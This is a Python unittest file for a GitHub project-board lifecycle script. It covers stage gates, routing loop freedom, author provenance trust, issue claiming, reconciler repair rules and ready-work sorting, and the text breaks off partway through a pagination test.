"""Tier-1 hermetic tests for lifecycle_board.py's pure decision core.

Covers: gate verdict tables, claim decisions (sole-assignee / blocked),
the CLOSED six-repair reconciler set with never-repair negatives, repo-scoped
ready-work merge + Priority sort + truncation flag, packet safety,
and call-count budgets via an argv-recording fake runner. No network, no gh.
"""
from __future__ import annotations

import importlib.util
import inspect
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "lifecycle_board.py"

spec = importlib.util.spec_from_file_location("lifecycle_board", SCRIPT)
assert spec is not None and spec.loader is not None
lb = importlib.util.module_from_spec(spec)
sys.modules["lifecycle_board"] = lb
spec.loader.exec_module(lb)

_GIT_ENV_PATCH: "list" = []


def setUpModule() -> None:
    """Scrub inherited GIT_* variables for the whole file.

    Several helpers here shell out through `_git`, which inherits the ambient
    environment — and `GIT_DIR` overrides `-C <tempdir>` outright. Under any
    process that sets it (a git hook, `git rebase --exec`, `git bisect run` —
    and this repository ships hooks) tests targeting a throwaway repo silently
    resolve the developer's REAL .git instead. That collapses every case into
    one shared namespace, so they cross-pollute and become order-dependent, and
    `--decompose` writes its receipts into the real repository. Module scope
    rather than one class's setUp: the exposure belongs to `_git`, so every
    class that reaches it needs the same guarantee.
    """
    patch = mock.patch.dict(os.environ)
    patch.start()
    _GIT_ENV_PATCH.append(patch)
    for var in ("GIT_DIR", "GIT_WORK_TREE", "GIT_COMMON_DIR", "GIT_INDEX_FILE",
                "GIT_OBJECT_DIRECTORY", "GIT_CEILING_DIRECTORIES"):
        os.environ.pop(var, None)


def tearDownModule() -> None:
    while _GIT_ENV_PATCH:
        _GIT_ENV_PATCH.pop().stop()


def _issue(number=1, state="OPEN", state_reason=None, assignees=(), stage=None,
           closing_prs=(), open_subs=(), blocked=0, parent_number=None,
           item_id="item"):
    return lb.IssueState(
        number=number, state=state, state_reason=state_reason,
        assignees=list(assignees), author_association="OWNER", stage=stage,
        item_id=item_id, closing_prs=list(closing_prs),
        open_sub_issues=list(open_subs), blocked_by_count=blocked,
        parent_number=parent_number,
    )


def _pr(number=10, state="MERGED", merged=True, base="main", author="me",
        provenance="trusted"):
    return {"number": number, "state": state, "merged": merged,
            "baseRefName": base, "author": author, "provenance": provenance}


class StageOrderTest(unittest.TestCase):
    def test_exact_lifecycle(self) -> None:
        self.assertEqual(lb.STAGES, ("stub", "brainstormed", "planned", "ready_for_work",
                                    "in_progress", "in_review", "done", "abandoned"))

    def test_stage_at_least(self) -> None:
        self.assertTrue(lb.stage_at_least("in_review", "planned"))
        self.assertFalse(lb.stage_at_least("stub", "planned"))
        self.assertFalse(lb.stage_at_least(None, "stub"))
        self.assertFalse(lb.stage_at_least("abandoned", "stub"))

    def test_order_is_the_single_total_order_over_stages(self) -> None:
        # One ordering, covering exactly STAGES — a parallel ordering would let
        # gate comparisons disagree with each other.
        self.assertEqual(set(lb._ORDER), set(lb.STAGES))
        forward = [s for s in lb.STAGES if s != "abandoned"]
        self.assertEqual(sorted(forward, key=lambda s: lb._ORDER[s]), forward)
        self.assertEqual(lb._ORDER["abandoned"], -1)

    def test_ready_for_work_sits_above_planned(self) -> None:
        # Approval is a stage the groomed item has NOT yet reached.
        self.assertFalse(lb.stage_at_least("planned", "ready_for_work"))
        self.assertTrue(lb.stage_at_least("ready_for_work", "planned"))
        self.assertTrue(lb.stage_at_least("in_progress", "ready_for_work"))


class GateTest(unittest.TestCase):
    """Status is the permission-gated lifecycle attestation."""

    def test_brainstorm_proceeds_on_stub(self) -> None:
        g = lb.evaluate_gate("brainstorm", "stub", True, None, None)
        self.assertEqual(g.verdict, "proceed")

    def test_brainstorm_routes_to_plan_when_brainstormed_with_doc(self) -> None:
        g = lb.evaluate_gate("brainstorm", "brainstormed", True, None, "docs/brainstorms/x.md")
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))

    def test_brainstorm_status_does_not_depend_on_local_doc(self) -> None:
        g = lb.evaluate_gate("brainstorm", "brainstormed", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))

    def test_brainstorm_on_stage_beyond_brainstormed_never_repairs(self) -> None:
        # An item that legally skipped stub→planned has no brainstorm doc by
        # construction — the gate must not walk the board backwards.
        g = lb.evaluate_gate("brainstorm", "planned", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))
        for stage in ("in_progress", "in_review", "done", "abandoned"):
            with self.subTest(stage=stage):
                g = lb.evaluate_gate("brainstorm", stage, True, None, None)
                self.assertEqual(g.verdict, "already_done")
                self.assertNotEqual(g.verdict, "repair_needed")

    def test_plan_already_done_offers_work(self) -> None:
        g = lb.evaluate_gate("plan", "ready_for_work", True, "docs/plans/x.md", None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_work"))

    def test_plan_treats_ready_for_work_as_readiness_attestation(self) -> None:
        g = lb.evaluate_gate("plan", "ready_for_work", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_work"))

    def test_plan_on_planned_routes_to_approval_never_back_to_work(self) -> None:
        # Planning is finished, but the item is not work-ready. Routing to work
        # here is what would make plan<->work an infinite bounce.
        g = lb.evaluate_gate("plan", "planned", True, "docs/plans/x.md", None)
        self.assertEqual((g.verdict, g.route), ("already_done", "approval"))

    def test_plan_stops_on_done(self) -> None:
        g = lb.evaluate_gate("plan", "done", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "none"))

    def test_work_requires_at_least_ready_for_work(self) -> None:
        g = lb.evaluate_gate("work", "brainstormed", True, None, None)
        self.assertEqual((g.verdict, g.route), ("route_to_plan", "plan"))

    def test_work_on_planned_names_the_missing_approval(self) -> None:
        g = lb.evaluate_gate("work", "planned", True, "docs/plans/x.md", None)
        self.assertEqual(g.verdict, "route_to_plan")
        self.assertIn("approv", g.reason)
        self.assertNotIn("groom first", g.reason)

    def test_work_gate_depends_on_status_not_artifact(self) -> None:
        g = lb.evaluate_gate("work", "ready_for_work", True, None, None)
        self.assertEqual(g.verdict, "proceed")
        g = lb.evaluate_gate("work", "ready_for_work", True, "docs/plans/x.md", None)
        self.assertEqual(g.verdict, "proceed")

    def test_work_resume_reason_names_actual_stage(self) -> None:
        g = lb.evaluate_gate("work", "in_progress", True, None, None)
        self.assertEqual(g.verdict, "proceed")
        self.assertIn("in_progress", g.reason)

    def test_work_terminal_stages_are_already_done(self) -> None:
        for stage in ("done", "abandoned"):
            with self.subTest(stage=stage):
                g = lb.evaluate_gate("work", stage, True, "docs/plans/x.md", None)
                self.assertEqual(g.verdict, "already_done")

    def test_compound_hotfix_path_without_issue(self) -> None:
        g = lb.evaluate_gate("compound", None, False, None, None)
        self.assertEqual(g.verdict, "proceed")
        self.assertIn("independent of Status", g.reason)

    def test_compound_never_mutates_lifecycle_status(self) -> None:
        self.assertEqual(lb.evaluate_gate("compound", "in_review", True, None, None).verdict, "proceed")
        self.assertEqual(lb.evaluate_gate("compound", "done", True, None, None).verdict, "proceed")
        self.assertEqual(lb.evaluate_gate("compound", "abandoned", True, None, None).verdict, "already_done")

    def test_untrusted_author_is_surfaced(self) -> None:
        g = lb.evaluate_gate("plan", "stub", True, None, None, author_association="NONE")
        self.assertEqual(g.provenance, "untrusted")


# Every stage the gate can observe, including the no-board `None`.
_ALL_GATE_STAGES = (None,) + lb.STAGES

# The whole decision table by CATEGORY (verdict, route) — never by reason text,
# which is prose and may be reworded without changing a single decision.
_GATE_TABLE = {
    "brainstorm": {
        None: ("proceed", "brainstorm"),
        "stub": ("proceed", "brainstorm"),
        "brainstormed": ("already_done", "route_to_plan"),
        "planned": ("already_done", "route_to_plan"),
        "ready_for_work": ("already_done", "none"),
        "in_progress": ("already_done", "none"),
        "in_review": ("already_done", "none"),
        "done": ("already_done", "none"),
        "abandoned": ("already_done", "none"),
    },
    "plan": {
        None: ("proceed", "plan"),
        "stub": ("proceed", "plan"),
        "brainstormed": ("proceed", "plan"),
        "planned": ("already_done", "approval"),
        "ready_for_work": ("already_done", "route_to_work"),
        "in_progress": ("already_done", "route_to_work"),
        "in_review": ("already_done", "route_to_work"),
        "done": ("already_done", "none"),
        "abandoned": ("already_done", "none"),
    },
    "work": {
        None: ("route_to_plan", "plan"),
        "stub": ("route_to_plan", "plan"),
        "brainstormed": ("route_to_plan", "plan"),
        "planned": ("route_to_plan", "plan"),
        "ready_for_work": ("proceed", "work"),
        "in_progress": ("proceed", "work"),
        "in_review": ("proceed", "work"),
        "done": ("already_done", "none"),
        "abandoned": ("already_done", "none"),
    },
    "compound": {s: ("proceed", "compound") for s in _ALL_GATE_STAGES
                 if s != "abandoned"},
    "orchestrate": {s: ("proceed", "orchestrate") for s in _ALL_GATE_STAGES},
}
_GATE_TABLE["compound"]["abandoned"] = ("already_done", "none")


class GateTableTest(unittest.TestCase):
    """The complete gate decision table, one row per (command, stage). Asserted
    by verdict/route category — the reason string is prose, not a contract."""

    def test_every_command_and_stage(self) -> None:
        for command, rows in _GATE_TABLE.items():
            self.assertEqual(set(rows), set(_ALL_GATE_STAGES),
                             f"{command} table must cover every stage")
            for stage, expected in rows.items():
                with self.subTest(command=command, stage=stage):
                    g = lb.evaluate_gate(command, stage, stage is not None, None, None)
                    self.assertEqual((g.verdict, g.route), expected)

    def test_every_verdict_is_declared(self) -> None:
        for verdict, _route in (v for rows in _GATE_TABLE.values() for v in rows.values()):
            self.assertIn(verdict, lb.VERDICTS)


class GateLoopFreedomTest(unittest.TestCase):
    """`plan` and `work` must never point at each other. Before `ready_for_work`
    existed, a `planned` item was `route_to_work` from plan and (after the work
    floor moved) `route_to_plan` from work — an orchestrator following routes
    would bounce forever. This asserts the absence of that 2-cycle directly,
    for EVERY stage, rather than pinning the two gates independently."""

    # Which command a route sends the caller to.
    _ROUTE_TARGET = {
        "plan": "plan",
        "route_to_plan": "plan",
        "work": "work",
        "route_to_work": "work",
    }
    # Routes that name no command: they terminate the walk and cannot form a
    # cycle. Enumerated explicitly rather than defaulted, so a NEW route token
    # fails this test loudly instead of silently dropping out of the cycle check
    # as an unrecognized value.
    _TERMINAL_ROUTES = frozenset({
        "none", "approval", "brainstorm", "compound", "orchestrate", "parent",
    })

    def _target(self, route: str) -> "str | None":
        """Resolve a route to the command it sends the caller to. An unknown
        route is a hard failure, not a silent None — otherwise renaming a route
        token would quietly disable this whole check."""
        if route in self._ROUTE_TARGET:
            return self._ROUTE_TARGET[route]
        self.assertIn(route, self._TERMINAL_ROUTES,
                      f"unknown gate route {route!r}: add it to _ROUTE_TARGET (if it "
                      "names a command) or _TERMINAL_ROUTES (if it does not)")
        return None

    def test_plan_and_work_never_route_to_each_other(self) -> None:
        for stage in _ALL_GATE_STAGES:
            with self.subTest(stage=stage):
                has_issue = stage is not None
                plan_to = self._target(
                    lb.evaluate_gate("plan", stage, has_issue, None, None).route)
                work_to = self._target(
                    lb.evaluate_gate("work", stage, has_issue, None, None).route)
                self.assertFalse(
                    plan_to == "work" and work_to == "plan",
                    f"stage {stage!r}: plan -> work and work -> plan is an infinite bounce")


class ProvenanceTest(unittest.TestCase):
    """One provenance rule, derived identically by --gate and --groom-entry. A
    GitHub App author lands outside every association (observed live: NONE on
    App-filed issues, CONTRIBUTOR on App-filed PRs), so without the Bot branch an
    App can file work it can never groom."""

    def test_bot_author_is_trusted_regardless_of_association(self) -> None:
        for association in ("NONE", "CONTRIBUTOR", "FIRST_TIME_CONTRIBUTOR"):
            with self.subTest(association=association):
                self.assertEqual(lb.resolve_provenance(association, author_is_bot=True), "trusted")

    def test_human_contributor_is_still_untrusted(self) -> None:
        self.assertEqual(lb.resolve_provenance("CONTRIBUTOR", author_is_bot=False), "untrusted")
        self.assertEqual(lb.resolve_provenance("NONE"), "untrusted")

    def test_privileged_associations_are_unchanged(self) -> None:
        for association in ("OWNER", "MEMBER", "COLLABORATOR"):
            with self.subTest(association=association):
                self.assertEqual(lb.resolve_provenance(association), "trusted")

    def test_gate_reports_the_bot_author_as_trusted(self) -> None:
        g = lb.evaluate_gate("plan", "stub", True, None, None,
                             author_association="NONE", author_is_bot=True)
        self.assertEqual(g.provenance, "trusted")

    def test_parse_issue_state_reads_the_bot_author_typename(self) -> None:
        board = lb.BoardConfig(owner="acme", number=1, source="test")
        bot = lb.parse_issue_state(
            _issue_query_response(author_type="Bot", author_association="NONE"), board)
        human = lb.parse_issue_state(
            _issue_query_response(author_type="User", author_association="CONTRIBUTOR"), board)
        self.assertTrue(bot.author_is_bot)
        self.assertFalse(human.author_is_bot)
        self.assertEqual(lb.resolve_provenance(bot.author_association, bot.author_is_bot), "trusted")
        self.assertEqual(lb.resolve_provenance(human.author_association, human.author_is_bot),
                         "untrusted")

    def test_parse_issue_state_resolves_provenance_per_closing_pr(self) -> None:
        # The reconciler's rule-3/5 scoping reads this field. Every plan_repairs
        # test hand-builds the dict, so without this case the parser could mark
        # every closing PR trusted and the suite would not notice.
        board = lb.BoardConfig(owner="acme", number=1, source="test")
        payload = _issue_query_response()
        payload["data"]["repository"]["issue"]["closedByPullRequestsReferences"] = {"nodes": [
            {"number": 1, "state": "CLOSED", "merged": False, "baseRefName": "main",
             "authorAssociation": "COLLABORATOR", "author": {"login": "t", "__typename": "User"}},
            {"number": 2, "state": "OPEN", "merged": False, "baseRefName": "main",
             "authorAssociation": "NONE", "author": {"login": "s", "__typename": "User"}},
            {"number": 3, "state": "OPEN", "merged": False, "baseRefName": "main",
             "authorAssociation": "NONE", "author": {"login": "b", "__typename": "Bot"}},
            {"number": 4, "state": "OPEN", "merged": False, "baseRefName": "main",
             "authorAssociation": "NONE", "author": None},
        ]}
        got = {p["number"]: p["provenance"]
               for p in lb.parse_issue_state(payload, board).closing_prs}
        self.assertEqual(got, {1: "trusted", 2: "untrusted",
                               3: "trusted", 4: "untrusted"})

    def test_deleted_author_is_not_a_bot(self) -> None:
        # `author` is null for a deleted account — must not crash or trust it.
        board = lb.BoardConfig(owner="acme", number=1, source="test")
        payload = _issue_query_response(author_association="NONE")
        payload["data"]["repository"]["issue"]["author"] = None
        state = lb.parse_issue_state(payload, board)
        self.assertFalse(state.author_is_bot)

    def test_bot_authored_issue_is_not_refused_by_route_for_groom(self) -> None:
        # The end of the chain this exists to fix: `untrusted_provenance` blocked
        # every App-filed item before any stage routing.
        trusted = lb.route_for_groom(True, "stub", None, None,
                                     lb.resolve_provenance("NONE", author_is_bot=True), False)
        untrusted = lb.route_for_groom(True, "stub", None, None,
                                       lb.resolve_provenance("NONE", author_is_bot=False), False)
        self.assertIsNone(trusted.blocker)
        self.assertEqual(untrusted.blocker, "untrusted_provenance")


class ClaimTest(unittest.TestCase):
    def test_sole_assignee_proceeds(self) -> None:
        self.assertEqual(lb.decide_claim(["me"], "me", 0).action, "proceed")

    def test_multi_assignee_is_conflict_even_when_included(self) -> None:
        # GitHub has no CAS: two winners are legal; both must not proceed.
        d = lb.decide_claim(["me", "other"], "me", 0)
        self.assertEqual(d.action, "conflict")

    def test_foreign_assignee_is_conflict(self) -> None:
        self.assertEqual(lb.decide_claim(["other"], "me", 0).action, "conflict")

    def test_blocked_refuses_claim(self) -> None:
        # Dependencies are advisory — the claim protocol enforces them.
        self.assertEqual(lb.decide_claim(["me"], "me", 2).action, "blocked")

    def test_bot_login_is_not_assignable(self) -> None:
        self.assertFalse(lb.is_assignable_principal("lifewithdata-dev[bot]"))
        self.assertTrue(lb.is_assignable_principal("aagnone3"))
        # The suffix, not the substring: a User may legitimately be named "…bot".
        self.assertTrue(lb.is_assignable_principal("dependabot"))

    def test_non_assignable_principal_proceeds_on_an_unassigned_issue(self) -> None:
        # No assignment exists to re-read, so the claim confirms on Status.
        d = lb.decide_claim([], "app[bot]", 0, assignable=False)
        self.assertEqual(d.action, "proceed")

    def test_non_assignable_principal_still_yields_to_a_foreign_assignee(self) -> None:
        d = lb.decide_claim(["other"], "app[bot]", 0, assignable=False)
        self.assertEqual(d.action, "conflict")

    def test_non_assignable_principal_still_refuses_a_blocked_issue(self) -> None:
        d = lb.decide_claim([], "app[bot]", 2, assignable=False)
        self.assertEqual(d.action, "blocked")

    def test_assignable_principal_still_conflicts_on_empty_assignees(self) -> None:
        # The human path is unchanged: an empty confirming read is a conflict,
        # never a silent second winner.
        self.assertEqual(lb.decide_claim([], "me", 0).action, "conflict")


class ReconcilerTest(unittest.TestCase):
    """The repair set is CLOSED at six; everything else is a never-repair."""

    def test_rule1_merged_close_missed_becomes_done(self) -> None:
        s = _issue(state="CLOSED", state_reason="COMPLETED", stage="in_review",
                   closing_prs=[_pr()])
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("merged_close_missed", "done")])
        self.assertEqual(flags, [])

    def test_flag_in_review_with_open_subissues_never_repairs(self) -> None:
        s = _issue(state="OPEN", stage="in_review", open_subs=[7, 9])
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])  # never auto-repaired
        self.assertEqual([(f.issue, f.flag) for f in flags],
                         [(1, "in_review_with_open_subissues")])

    def test_no_flag_when_in_review_subissues_all_closed(self) -> None:
        s = _issue(state="OPEN", stage="in_review", open_subs=[])
        _repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual(flags, [])

    def test_rule2_not_planned_close_becomes_abandoned_with_cascade(self) -> None:
        s = _issue(state="CLOSED", state_reason="NOT_PLANNED", stage="done",
                   open_subs=[7, 8])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs[0].rule, "not_planned_close")
        self.assertEqual(repairs[0].to_stage, "abandoned")
        self.assertEqual(repairs[0].close_sub_issues, [7, 8])

    def test_rule3_keys_on_merged_false_not_state_closed(self) -> None:
        # Merge queues: merged PRs report state CLOSED — must NOT regress.
        merged = _issue(assignees=["me"], stage="in_review",
                        closing_prs=[_pr(state="CLOSED", merged=True)])
        repairs, _ = lb.plan_repairs([merged], "main")
        self.assertNotIn("pr_closed_unmerged", [r.rule for r in repairs])

        closed_unmerged = _issue(assignees=["me"], stage="in_review",
                                 closing_prs=[_pr(state="CLOSED", merged=False, author="me")])
        repairs, _ = lb.plan_repairs([closed_unmerged], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("pr_closed_unmerged", "in_progress")])

    def test_rule3_repairs_for_any_trusted_author_not_just_an_assignee(self) -> None:
        # Rules 3 and 5 are provenance-anchored, not assignee-anchored: the old
        # filter disabled them for every bot-authored PR and every unassigned
        # issue. A trusted non-assignee now repairs.
        s = _issue(assignees=["me"], stage="in_review",
                   closing_prs=[_pr(state="CLOSED", merged=False, author="teammate")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("pr_closed_unmerged", "in_progress")])

    def test_untrusted_closing_pr_drives_no_repair(self) -> None:
        # A closing reference is anyone's to create: any fork PR whose body says
        # `Closes #N` lands in this list. Asserted across BOTH regression shapes.
        for stage, pr in (("in_review", _pr(state="CLOSED", merged=False)),
                          ("in_progress", _pr(state="OPEN", merged=False))):
            with self.subTest(stage=stage):
                s = _issue(assignees=(), stage=stage,
                           closing_prs=[dict(pr, author="stranger", provenance="untrusted")])
                repairs, _ = lb.plan_repairs([s], "main")
                self.assertEqual(repairs, [])

    def test_untrusted_open_pr_cannot_suppress_a_trusted_repair(self) -> None:
        # Rule 3 is `all(closed and unmerged)`, so an untrusted OPEN reference
        # mixed into the list would SILENTLY SUPPRESS a repair that must fire —
        # the opposite direction from the nuisance case, and worse: the issue
        # sticks at in_review forever with no repair and no flag. Filtering has to
        # happen before the all().
        s = _issue(assignees=["me"], stage="in_review", closing_prs=[
            _pr(number=1, state="CLOSED", merged=False, author="me"),
            _pr(number=2, state="OPEN", merged=False, author="stranger",
                provenance="untrusted"),
        ])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("pr_closed_unmerged", "in_progress")])

    def test_a_trusted_open_pr_still_suppresses_rule3(self) -> None:
        # The all() itself is load-bearing and must survive: real work in flight
        # (a trusted OPEN PR) means the item is not regressing.
        s = _issue(assignees=["me"], stage="in_review", closing_prs=[
            _pr(number=1, state="CLOSED", merged=False, author="me"),
            _pr(number=2, state="OPEN", merged=False, author="teammate"),
        ])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])

    def test_a_merged_pr_drives_rule1_regardless_of_provenance(self) -> None:
        # merged_pr is deliberately NOT provenance-filtered: merging is a
        # maintainer action, so an outside contributor's merged PR is legitimate.
        s = _issue(state="CLOSED", state_reason="COMPLETED", stage="in_review",
                   closing_prs=[_pr(author="outsider", provenance="untrusted")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("merged_close_missed", "done")])

    def test_rule3_fires_on_an_unassigned_issue(self) -> None:
        # `if s.assignees else []` meant an unassigned issue never repaired at all.
        s = _issue(assignees=(), stage="in_review",
                   closing_prs=[_pr(state="CLOSED", merged=False, author="somebot")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("pr_closed_unmerged", "in_progress")])

    def test_rule5_fires_on_an_unassigned_issue_with_a_bot_authored_pr(self) -> None:
        s = _issue(assignees=(), stage="in_progress",
                   closing_prs=[_pr(state="OPEN", merged=False, author="lifewithdata-dev")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs], [("pr_reopened", "in_review")])

    def test_rule5_still_skips_open_sub_issues_when_unassigned(self) -> None:
        # The sub-issue guard is unrelated to assignment and must survive.
        s = _issue(assignees=(), stage="in_progress", open_subs=[7],
                   closing_prs=[_pr(state="OPEN", merged=False, author="somebot")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])

    def test_rule4_abandoned_parent_cascades(self) -> None:
        s = _issue(stage="abandoned", open_subs=[3])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs[0].rule, "abandoned_cascade")
        self.assertIsNone(repairs[0].to_stage)

    def test_rule5_open_assignee_pr_advances_to_in_review(self) -> None:
        s = _issue(assignees=["me"], stage="in_progress",
                   closing_prs=[_pr(state="OPEN", merged=False, author="me")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs], [("pr_reopened", "in_review")])

    def test_rule5_skips_parent_with_open_sub_issues(self) -> None:
        # The repair must not force the exact write the open_sub_issues seam
        # gate refuses: in_progress + open PR + open sub-issues stays put.
        s = _issue(assignees=["me"], stage="in_progress", open_subs=[7],
                   closing_prs=[_pr(state="OPEN", merged=False, author="me")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])

    def test_flag_merged_to_non_default_branch_never_repairs(self) -> None:
        # The git-flow stall: merged into develop, issue still open.
        s = _issue(assignees=["me"], stage="in_review",
                   closing_prs=[_pr(state="MERGED", merged=True, base="develop", author="me")])
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])
        self.assertEqual([f.flag for f in flags], ["merged_to_non_default_branch"])

    def test_never_repairs_human_drags(self) -> None:
        # Open issue, no PRs, arbitrary stage: reconciler must not touch it.
        for stage in ("stub", "planned", "in_progress", "in_review", "done"):
            with self.subTest(stage=stage):
                repairs, flags = lb.plan_repairs([_issue(stage=stage)], "main")
                self.assertEqual((repairs, flags), ([], []))

    def test_abandoned_never_promoted_to_shipped(self) -> None:
        s = _issue(state="CLOSED", state_reason="COMPLETED", stage="abandoned",
                   closing_prs=[_pr()])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])

    # Rule 6: sub_issue_on_board — an OPEN, parented issue must not occupy the
    # board (the Project tracks the PARENT); its board item is archived.
    def test_rule6_open_parented_boarded_issue_is_deboarded(self) -> None:
        s = _issue(number=263, state="OPEN", stage="stub", parent_number=265,
                   item_id="IT_9")
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage, r.deboard_item_id) for r in repairs],
                         [("sub_issue_on_board", None, "IT_9")])
        self.assertIn("265", repairs[0].comment)  # audit comment names the parent
        self.assertEqual(flags, [])

    def test_rule6_absent_board_item_is_a_noop(self) -> None:
        # The idempotent second run: after removal the item is gone, so no repair.
        s = _issue(number=263, state="OPEN", stage="stub", parent_number=265,
                   item_id=None)
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual((repairs, flags), ([], []))

    def test_rule6_leaves_terminal_closed_subissues_untouched(self) -> None:
        # A CLOSED (terminal) sub-issue is done; rule 6 never fires for it.
        for stage in ("done", "in_review", "stub"):
            with self.subTest(stage=stage):
                s = _issue(number=263, state="CLOSED", state_reason="COMPLETED",
                           stage=stage, parent_number=265, item_id="IT_9")
                repairs, _ = lb.plan_repairs([s], "main")
                self.assertNotIn("sub_issue_on_board", [r.rule for r in repairs])

    def test_rule6_ignores_parentless_boarded_issue(self) -> None:
        s = _issue(number=42, state="OPEN", stage="planned", parent_number=None,
                   item_id="IT_1")
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertNotIn("sub_issue_on_board", [r.rule for r in repairs])

    def test_rule6_preempts_stage_regression_rules(self) -> None:
        # De-boarding a parented open issue supersedes any Status repair its own
        # (noise) board stage would otherwise trigger. Both regression shapes:
        cases = {
            # rule 5 shape: in_progress + open assignee PR (would advance to in_review)
            "rule5": dict(stage="in_progress",
                          closing_prs=[_pr(state="OPEN", merged=False, author="me")]),
            # rule 3 shape: in_review + all-closed-unmerged assignee PRs (would
            # regress to in_progress)
            "rule3": dict(stage="in_review",
                          closing_prs=[_pr(state="CLOSED", merged=False, author="me")]),
        }
        for name, kw in cases.items():
            with self.subTest(shape=name):
                s = _issue(number=263, state="OPEN", parent_number=265,
                           item_id="IT_9", assignees=["me"], **kw)
                repairs, _ = lb.plan_repairs([s], "main")
                self.assertEqual([r.rule for r in repairs], ["sub_issue_on_board"])


class ReadyWorkTest(unittest.TestCase):
    def _item(self, number, repo="o/r", priority=None, title="t", type_="Issue"):
        return {"content": {"type": type_, "number": number, "repository": repo, "title": title},
                "priority": priority}

    def test_foreign_repo_items_are_dropped_never_written(self) -> None:
        items = [self._item(1, repo="o/r"), self._item(2, repo="other/repo")]
        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
        self.assertEqual([r.number for r in ready], [1])

    def test_missing_or_ambiguous_repo_metadata_fails_closed(self) -> None:
        items = [
            {"content": {"type": "Issue", "number": 1, "title": "missing"}},
            self._item(2, repo=""),
            self._item(3, repo={}),
            self._item(4, repo={"nameWithOwner": "o/r"}),
        ]
        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
        self.assertEqual([r.number for r in ready], [4])

    def test_blocked_items_are_excluded(self) -> None:
        items = [self._item(1), self._item(2)]
        ready, _ = lb.merge_ready_legs(items, {2: 1}, "o/r")
        self.assertEqual([r.number for r in ready], [1])

    def test_priority_sort(self) -> None:
        items = [self._item(1, priority="p3"), self._item(2, priority="p1"),
                 self._item(3, priority=None), self._item(4, priority="p2")]
        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
        self.assertEqual([r.number for r in ready], [2, 4, 1, 3])

    def test_equal_priority_ties_break_to_the_oldest_issue(self) -> None:
        items = [self._item(9, priority="p1"), self._item(2, priority="p1"),
                 self._item(5, priority="p1")]
        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
        self.assertEqual([r.number for r in ready], [2, 5, 9])

    def test_truncation_flag_at_cap(self) -> None:
        items = [self._item(i) for i in range(lb.READY_WORK_LIMIT)]
        _, truncated = lb.merge_ready_legs(items, {}, "o/r")
        self.assertTrue(truncated)
        _, truncated = lb.merge_ready_legs(items[:5], {}, "o/r")
        self.assertFalse(truncated)


class FakeRunner:
    """Argv-recording fake gh. Fails the test on unexpected argv — mocks
    cannot drift from the contract without a test naming the divergence."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    def __call__(self, args, timeout=None):
        self.calls.append(args)
        if not self.responses:
            raise AssertionError(f"unexpected gh call: gh {' '.join(args[:6])}")
        expect_prefix, proc = self.responses.pop(0)
        if args[:len(expect_prefix)] != expect_prefix:
            raise AssertionError(f"argv drift: expected {expect_prefix}, got {args[:len(expect_prefix)]}")
        return proc


def _ok(stdout: str) -> "subprocess.CompletedProcess[str]":
    return subprocess.CompletedProcess(args=[], returncode=0, stdout=stdout, stderr="")


class ProjectLinkedReposTest(unittest.TestCase):
    """The shared board<->repo link reader used by both the doctor check and
    the bootstrap link step."""

    @staticmethod
    def _payload(slugs):
        nodes = [{"nameWithOwner": s} for s in slugs]
        return json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "repositories": {"nodes": nodes}}}}})

    def test_parses_linked_slugs(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload(["o/r", "o/other"])))])
        self.assertEqual(lb.project_linked_repos("o", 5, runner), ["o/r", "o/other"])
        # Uses the owner-type-agnostic repositoryOwner query, not organization(login:).
        query = runner.calls[0][runner.calls[0].index("-f") + 1]
        self.assertIn("repositoryOwner(login: $owner)", query)
        self.assertIn("... on User", query)
        self.assertIn("... on Organization", query)

    def test_empty_when_no_repos_linked(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload([])))])
        self.assertEqual(lb.project_linked_repos("o", 5, runner), [])

    def test_none_on_query_failure(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="boom")
        runner = FakeRunner([(["api", "graphql"], fail)])
        self.assertIsNone(lb.project_linked_repos("o", 5, runner))

    def test_paginates_past_one_hundred_linked_repositories(self) -> None:
        first = json.dumps({"data": {"repositoryOwner": {"projectV2": {
